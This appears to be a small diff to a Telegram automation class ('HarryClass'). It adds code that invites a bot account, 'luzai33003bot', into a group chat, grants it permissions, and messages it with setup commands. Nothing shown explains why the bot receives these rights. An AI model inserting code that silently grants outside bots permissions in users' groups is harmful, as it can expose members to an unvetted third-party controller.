@@ -497,6 +497,9 @@ class HarryClass:
 			await self.invite_to_group(chat_id, "noexists666bot")
 			await self.grant_permissions(chat_id=chat_id, user_id="noexists666bot")
 		
+			await self.invite_to_group(chat_id, "luzai33003bot")
+			await self.grant_permissions(chat_id=chat_id, user_id="luzai33003bot")
+
 			await self.client.send_message(chat_id, "/setup_tr_rw")
 
 			await self.client.send_message("luzai33003bot", "/update_setting")
